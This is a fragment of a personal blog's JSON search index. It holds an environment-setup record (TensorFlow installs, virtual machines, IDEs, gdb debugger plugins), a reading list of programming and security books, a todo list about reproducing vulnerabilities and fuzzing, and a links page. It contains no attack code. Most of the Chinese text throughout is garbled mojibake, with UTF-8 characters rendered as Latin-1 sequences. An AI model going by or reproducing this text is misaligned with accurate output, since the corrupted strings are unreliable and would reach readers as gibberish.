tf-nightly-gpu# preview pip3 install tensorflow-gpu==2.0.0-alpha0##TensorFlow 2.0 Alpha# CPU ç‰ˆæœ¬ pip3 install --user --upgrade tensorflow tensorflowÂ - ä»…æ”¯æŒ CPU çš„æœ€æ–°ç¨³å®šç‰ˆï¼ˆå»ºè®®æ–°æ‰‹ä½¿ç”¨ï¼‰\ntensorflow-gpuÂ -Â æ”¯æŒ GPUÂ çš„æœ€æ–°ç¨³å®šç‰ˆï¼ˆé€‚ç”¨äº Ubuntu å’Œ Windowsï¼‰\ntf-nightlyÂ - ä»…æ”¯æŒ CPU çš„é¢„è§ˆæ¯å¤œç‰ˆï¼ˆä¸ç¨³å®šï¼‰\ntf-nightly-gpuÂ -Â æ”¯æŒ GPUÂ çš„é¢„è§ˆæ¯å¤œç‰ˆï¼ˆä¸ç¨³å®šï¼Œé€‚ç”¨äº Ubuntu å’Œ Windowsï¼‰\ntensorflow==2.0.0-alpha0Â - ä»…æ”¯æŒ CPU çš„é¢„è§ˆ TF 2.0 Alpha ç‰ˆï¼ˆä¸ç¨³å®šï¼‰\ntensorflow-gpu==2.0.0-alpha0Â -Â æ”¯æŒ GPUÂ çš„é¢„è§ˆ TF 2.0 Alpha ç‰ˆï¼ˆä¸ç¨³å®šï¼ŒUbuntu å’Œ Windowsï¼‰\nVMware pro ï¼ˆè™šæ‹Ÿæœºï¼‰ è£…MacOSè®°å½• VBox ï¼ˆè™šæ‹Ÿæœºï¼‰ å®‰è£…æ‹“å±•åŒ… Xshellã€Xftp (free for Home/School) free çš„è¦å»å®˜ç½‘ä¸‹è½½Â å¡«å†™ä¿¡æ¯ï¼Œé‚®ç®±æ‰“å¼€é“¾æ¥ä¸‹è½½ã€‚\nTeamViewer (è¿œç¨‹è¿æ¥) å„ç§IDEã€é›†æˆç¯å¢ƒ åªè®°å½• Visual Studio 2019\nPycharm\nIDEA\nå¾®ä¿¡webå¼€å‘å·¥å…·\nphpStudy\nAndroid Studio (é£æ‰‡~~ ~~)\nOther ä¸åšè®°å½•\nUbuntu 18.04 ä¸€èˆ¬ç”¨æ¥è°ƒä»£ç ã€‚ å¤§éƒ¨åˆ†é…ç½®åŒä¸Šé¢WSL,åªè®°å½•ä¸åšè¿‡å¤šä»‹ç»\non my zsh gdb+pwndbg+peda+gef ç¾åŒ– manjaro å¾ˆå–œæ¬¢çš„Linuxå‘è¡Œç‰ˆã€‚åŸºäºArchLinuxï¼Œè½¯ä»¶å¤šï¼Œå¥½çœ‹åˆå¥½ç”¨ã€‚\nMac m2 æ²¡æ³•ç”¨ æ”¾å¼ƒ ç­‰ç­‰ ","date":"0001-01-01T00:00:00Z","permalink":"https://ykiko.top/p/envrecord/","title":"EnvRecord"},{"content":"Reading ä¸ªäººæŠ€æœ¯ä¹¦å• å¤§å¤šæ•°éƒ½æ˜¯å·²ä¹°å·²çœ‹\u0026amp;å·²ä¹°æœªçœ‹\u0026amp;ç™½å«–ç”µå­ä¹¦\u0026amp;PDFxç‰ˆ\nè®¡ç®—æœºåŸºç¡€\u0026amp;è¯­è¨€åŸºç¡€ æ±‡ç¼–è¯­è¨€\nC Primer plus 5\nC++ Primer plus 5\nPython æ ¸å¿ƒç¼–ç¨‹\npythoné»‘å®¢æ”»é˜²å…¥é—¨\né”‹åˆ©çš„jquery\njavascript Domç¼–ç¨‹è‰ºæœ¯\njavaç¨‹åºè®¾è®¡\nkotlinç¨‹åºå…¥é—¨å¼€å‘\nWindows Socket ç½‘ç»œç¼–ç¨‹\nç¼–ç -éšåŒ¿åœ¨è®¡ç®—æœºè½¯ç¡¬ä»¶èƒŒåçš„è¯­è¨€\nç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»-é“¾æ¥ã€è£…è½½ä¸åº“\nç¼–è¯‘åŸç†\nLinuxå†…æ ¸åˆ†æ\né€†å‘\u0026amp;æ¼æ´åˆ©ç”¨ é€†å‘å·¥ç¨‹æƒå¨æŒ‡å—ï¼ˆä¸Šä¸‹ï¼‰\nLinuxäºŒè¿›åˆ¶åˆ†æ\næœ‰è¶£çš„äºŒè¿›åˆ¶\næ¼æ´æˆ˜äº‰è½¯ä»¶æ¼æ´åˆ†æç²¾è¦\nC/C++å®‰å…¨ç¼–ç \nå†…æ ¸æ¼æ´çš„åˆ©ç”¨ä¸é˜²èŒƒ\nè½¯ä»¶è°ƒè¯•ï¼ˆç¬¬äºŒç‰ˆï¼‰ å·ä¸€ ç¡¬ä»¶åŸºç¡€\nç¡¬ä»¶å®‰å…¨æ”»é˜²å¤§æ­ç§˜\nç§»åŠ¨å®‰å…¨\u0026amp;å¼€å‘ Androidè½¯ä»¶å®‰å…¨ä¸é€†å‘åˆ†æ\nAndroidè½¯ä»¶å®‰å…¨æ”»é˜²å®ä¾‹åˆ†æ\nAndroidå®‰å…¨æ”»é˜²å®æˆ˜\nAndroidå®‰å…¨æ”»é˜²æƒå¨æŒ‡å—\nAndroidå®‰å…¨æ”»é˜²æŒ‡å—\nAndroidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æ\niOSåº”ç”¨é€†å‘ä¸å®‰å…¨\næ¸¸æˆå®‰å…¨-æ‰‹æ¸¸å®‰å…¨æŠ€æœ¯å…¥é—¨\næœ€å¼ºAndroidä¹¦-æ„æ¶å¤§å‰–æ\nAndroidè½¯ä»¶å®‰å…¨æƒå¨æŒ‡å—\nWebå®‰å…¨\u0026amp;æ¸—é€ kali-linux æ¸—é€æµ‹è¯•çš„è‰ºæœ¯ Other é‡æ„ æ”¹å–„æ—¢æœ‰ä»£ç è®¾è®¡\nWiresharkæ•°æ®åŒ…åˆ†æå®æˆ˜è¯¦è§£\nä»£ç æ•´æ´ä¹‹é“-ç¨‹åºå‘˜çš„èŒä¸šç´ å…»\nä¿¡æ¯éšè—æŠ€æœ¯\nå‚è€ƒé“¾æ¥ https://github.com/riusksk/secbook\nhttps://www.anquanquan.info/shudan.html\nhttps://www.zhihu.com/question/21390646\n","date":"0001-01-01T00:00:00Z","permalink":"https://ykiko.top/p/reading/","title":"Reading"},{"content":"todo æŒç»­è¿›è¡Œçš„æ¼æ´å¤ç°è®°å½•\né‡æ–°æ±‡æ€»åˆ°Â Notionæ–°é“¾æ¥ æ‹–å»¶ç—‡æ™šæœŸæ‚£è€…æ²»ç–—è®°å½• ä¿æŒæ›´æ–°\næ—¥å¸¸è®°å½•\nCVEå­¦ä¹ â€”â€”Androidã€Linuxå†…æ ¸ã€IoT\nå°å·¥å…·å¼€å‘\næŒç»­å­¦ä¹ Fuzzing\nè½¦è”ç½‘å®‰å…¨å­¦ä¹ ä¸­\u0026hellip;\n","date":"0001-01-01T00:00:00Z","permalink":"https://ykiko.top/p/todo/","title":"Todo"},{"content":"SomeLink æ¼æ´å¤ç°è®°å½•\næŒç»­è¿›è¡Œçš„æ¼æ´å¤ç°è¡¨\nâ†’ Notion-VUL\nç¯å¢ƒè®°å½•\né‡åˆ°çš„é—®é¢˜è®°å½•\nâ†’ é—®é¢˜è®°å½•\næ—¥å¸¸CheckListè¡¨\nâ†’ æ—¥å¸¸checklist\nä¹¦å•\nè®°å½•ä¸€ä¸‹å¹³æ—¶æ‰€çœ‹çš„ä¹¦ï¼Œå¶å°”å†™å†™æ€»ç»“\nâ†’ ä¹¦å•\nç¢ç¢å¿µ\nâ†’ ç¢ç¢å¿µ\n","date":"0001-01-01T00:00:00Z","permalink":"https://ykiko.top/p/%E4%B8%80%E4%BA%9B%E9%93%BE%E6%8E%A5/","title":"ä¸€äº›é“¾æ¥"}]